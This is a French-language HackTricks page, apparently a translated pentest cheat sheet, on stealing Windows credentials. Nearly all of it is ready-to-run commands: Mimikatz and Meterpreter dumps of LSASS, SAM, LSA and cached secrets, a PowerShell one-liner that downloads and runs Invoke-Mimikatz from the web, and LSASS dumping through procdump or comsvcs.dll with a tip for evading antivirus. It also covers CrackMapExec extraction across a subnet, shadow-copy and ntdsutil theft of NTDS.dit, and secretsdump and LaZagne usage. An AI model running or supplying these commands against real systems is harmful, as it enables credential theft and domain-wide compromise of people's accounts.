# Vol de Credentials Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Suivez HackenProof**](https://bit.ly/3xrrDrL) **pour en savoir plus sur les bugs web3**

🐞 Lisez les tutoriels sur les bugs web3

🔔 Soyez informé des nouveaux programmes de primes pour bugs

💬 Participez aux discussions de la communauté

## Mimikatz de Credentials
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Trouvez d'autres choses que Mimikatz peut faire dans** [**cette page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Apprenez-en davantage sur certaines protections possibles des identifiants ici.**](credentials-protections.md) **Ces protections pourraient empêcher Mimikatz d'extraire certains identifiants.**

## Identifiants avec Meterpreter

Utilisez le [**plugin Credentials**](https://github.com/carlospolop/MSF-Credentials) **que j'ai créé pour rechercher des mots de passe et des hachages** à l'intérieur de la victime.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Contournement de l'antivirus

### Procdump + Mimikatz

Comme **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**est un outil Microsoft légitime**, il n'est pas détecté par Defender.\
Vous pouvez utiliser cet outil pour **dumper le processus lsass**, **télécharger le dump** et **extraire les informations d'identification localement** à partir du dump.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extraire les identifiants du dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Ce processus est effectué automatiquement avec [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Remarque**: Certains **AV** peuvent **détecter** comme **malveillante** l'utilisation de **procdump.exe pour extraire lsass.exe**, cela est dû à la **détection** des chaînes **"procdump.exe" et "lsass.exe"**. Il est donc plus **furtif** de **passer** en **argument** le **PID** de lsass.exe à procdump **au lieu du** nom lsass.exe.

### Extraction de lsass avec **comsvcs.dll**

Il existe une DLL appelée **comsvcs.dll**, située dans `C:\Windows\System32`, qui **extrait la mémoire du processus** chaque fois qu'il **plante**. Cette DLL contient une **fonction** appelée **`MiniDumpW`** qui peut être appelée avec `rundll32.exe`.\
Les deux premiers arguments ne sont pas utilisés, mais le troisième est divisé en 3 parties. La première partie est l'ID du processus qui sera extrait, la deuxième partie est l'emplacement du fichier d'extraction, et la troisième partie est le mot **full**. Il n'y a pas d'autre choix.\
Une fois que ces 3 arguments ont été analysés, cette DLL crée le fichier d'extraction et extrait le processus spécifié dans ce fichier d'extraction.\
Grâce à cette fonction, nous pouvons utiliser **comsvcs.dll** pour extraire le processus lsass au lieu de télécharger procdump et de l'exécuter. (Cette information a été extraite de [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/))
```
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
Il faut garder à l'esprit que cette technique ne peut être exécutée qu'en tant que **SYSTEM**.

**Vous pouvez automatiser ce processus avec** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass avec le Gestionnaire des tâches**

1. Cliquez avec le bouton droit de la souris sur la barre des tâches et cliquez sur Gestionnaire des tâches
2. Cliquez sur Plus de détails
3. Recherchez le processus "Processus d'autorité de sécurité locale" dans l'onglet Processus
4. Cliquez avec le bouton droit de la souris sur le processus "Processus d'autorité de sécurité locale" et cliquez sur "Créer un fichier de vidage".

### Dumping lsass avec procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) est un binaire signé par Microsoft qui fait partie de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## CrackMapExec

### Extraire les hachages SAM

CrackMapExec peut être utilisé pour extraire les hachages SAM à partir d'un système Windows distant. Les hachages SAM contiennent les mots de passe des utilisateurs locaux du système.

Pour extraire les hachages SAM, exécutez la commande suivante:

```
crackmapexec <cible> --sam
```

Cela extraira les hachages SAM et les enregistrera dans un fichier texte. Les hachages peuvent ensuite être utilisés pour tenter de casser les mots de passe des utilisateurs locaux.
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Voler les secrets LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Extraire le fichier NTDS.dit du DC cible
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Extraire l'historique des mots de passe NTDS.dit à partir du DC cible
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Afficher l'attribut pwdLastSet pour chaque compte NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Suivez HackenProof**](https://bit.ly/3xrrDrL) **pour en savoir plus sur les bugs web3**

🐞 Lisez les tutoriels sur les bugs web3

🔔 Soyez informé des nouveaux programmes de primes pour bugs

💬 Participez aux discussions de la communauté

## Vol de SAM & SYSTEM

Ces fichiers doivent être **situés** dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM._ Mais **vous ne pouvez pas simplement les copier de manière régulière** car ils sont protégés.

### À partir du Registre

Le moyen le plus simple de voler ces fichiers est d'en obtenir une copie à partir du registre :
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Téléchargez** ces fichiers sur votre machine Kali et **extraites les hachages** en utilisant:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Vous pouvez effectuer une copie de fichiers protégés en utilisant ce service. Vous devez être administrateur.

#### Utilisation de vssadmin

Le binaire vssadmin est uniquement disponible dans les versions de Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mais vous pouvez faire la même chose depuis **Powershell**. Voici un exemple de **comment copier le fichier SAM** (le disque dur utilisé est "C:" et il est enregistré dans C:\users\Public) mais vous pouvez utiliser cela pour copier n'importe quel fichier protégé:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Enfin, vous pouvez également utiliser le script PS [**Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) pour faire une copie de SAM, SYSTEM et ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Identifiants Active Directory - NTDS.dit**

Le fichier Ntds.dit est une base de données qui stocke les données d'Active Directory, y compris des informations sur les objets utilisateur, les groupes et l'appartenance à des groupes. Il inclut les hachages de mots de passe pour tous les utilisateurs du domaine.

Le fichier NTDS.dit important se trouve dans : _%SystemRoom%/NTDS/ntds.dit_\
Ce fichier est une base de données _Extensible Storage Engine_ (ESE) et est "officiellement" composé de 3 tables :

* **Table de données** : Contient les informations sur les objets (utilisateurs, groupes...)
* **Table de liaison** : Informations sur les relations (membre de...)
* **Table SD** : Contient les descripteurs de sécurité de chaque objet

Plus d'informations à ce sujet : [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows utilise _Ntdsa.dll_ pour interagir avec ce fichier et il est utilisé par _lsass.exe_. Ensuite, **une partie** du fichier **NTDS.dit** pourrait être située **à l'intérieur de la mémoire de `lsass`** (vous pouvez trouver les dernières données consultées probablement en raison de l'amélioration des performances en utilisant un **cache**).

#### Décryptage des hachages à l'intérieur de NTDS.dit

Le hachage est chiffré 3 fois :

1. Décrypter la clé de chiffrement de mot de passe (**PEK**) en utilisant la **BOOTKEY** et **RC4**.
2. Décrypter le **hachage** en utilisant **PEK** et **RC4**.
3. Décrypter le **hachage** en utilisant **DES**.

**PEK** a la **même valeur** dans **chaque contrôleur de domaine**, mais il est **chiffré** à l'intérieur du fichier **NTDS.dit** en utilisant la **BOOTKEY** du **fichier SYSTEM du contrôleur de domaine (différent entre les contrôleurs de domaine)**. C'est pourquoi pour obtenir les informations d'identification à partir du fichier NTDS.dit, **vous avez besoin des fichiers NTDS.dit et SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copie de NTDS.dit en utilisant Ntdsutil

Disponible depuis Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Vous pouvez également utiliser la technique de [**copie d'ombre de volume**](./#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N'oubliez pas que vous aurez également besoin d'une copie du fichier **SYSTEM** (encore une fois, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) trick).

### **Extraction des hachages de NTDS.dit**

Une fois que vous avez **obtenu** les fichiers **NTDS.dit** et **SYSTEM**, vous pouvez utiliser des outils tels que _secretsdump.py_ pour **extraire les hachages** :
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Vous pouvez également les **extraire automatiquement** en utilisant un utilisateur administrateur de domaine valide :
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Pour les **gros fichiers NTDS.dit**, il est recommandé de l'extraire en utilisant [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Enfin, vous pouvez également utiliser le module **metasploit**: _post/windows/gather/credentials/domain\_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraction des objets de domaine de NTDS.dit vers une base de données SQLite**

Les objets NTDS peuvent être extraits vers une base de données SQLite avec [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non seulement les secrets sont extraits, mais également l'ensemble des objets et de leurs attributs pour une extraction d'informations ultérieure lorsque le fichier brut NTDS.dit est déjà récupéré.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Le fichier `SYSTEM` est facultatif mais permet de décrypter des secrets (hachages NT et LM, informations supplémentaires telles que des mots de passe en clair, des clés Kerberos ou de confiance, des historiques de mots de passe NT et LM). Les données suivantes sont extraites, ainsi que d'autres informations : comptes utilisateur et machine avec leurs hachages, indicateurs UAC, horodatage de la dernière connexion et du changement de mot de passe, descriptions de comptes, noms, UPN, SPN, groupes et adhésions récursives, arborescence des unités organisationnelles et adhésion, domaines de confiance avec type, direction et attributs de confiance...

## Lazagne

Téléchargez le fichier binaire à partir de [ici](https://github.com/AlessandroZ/LaZagne/releases). Vous pouvez utiliser ce binaire pour extraire des informations d'identification de plusieurs logiciels.
```
lazagne.exe all
```
## Autres outils pour extraire les identifiants de SAM et LSASS

### Windows credentials Editor (WCE)

Cet outil peut être utilisé pour extraire les identifiants de la mémoire. Téléchargez-le à partir de: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extraire les identifiants du fichier SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extraire les identifiants du fichier SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Téléchargez-le à partir de: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) et **exécutez-le** simplement et les mots de passe seront extraits.

## Défenses

[**Apprenez-en davantage sur certaines protections de mots de passe ici.**](credentials-protections.md)

​

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Suivez HackenProof**](https://bit.ly/3xrrDrL) **pour en savoir plus sur les bugs web3**

🐞 Lisez les tutoriels de bugs web3

🔔 Soyez informé des nouveaux programmes de primes pour bugs

💬 Participez aux discussions de la communauté

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
